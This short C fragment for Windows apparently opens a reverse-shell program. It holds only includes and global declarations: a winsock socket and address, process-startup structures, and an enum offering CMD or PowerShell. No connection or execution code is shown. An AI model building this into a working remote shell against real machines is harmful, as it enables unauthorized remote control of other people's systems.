// includes
#include <stdio.h>
#include <string.h>
#include <tchar.h>

#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>

#pragma comment(lib, "ws2_32")

WSADATA wsaData;
SOCKET sock;
STARTUPINFO startInfo;
PROCESS_INFORMATION procInfo;
struct sockaddr_in sockAddr;

enum shells {
    CMD,
    POWERSHELL
};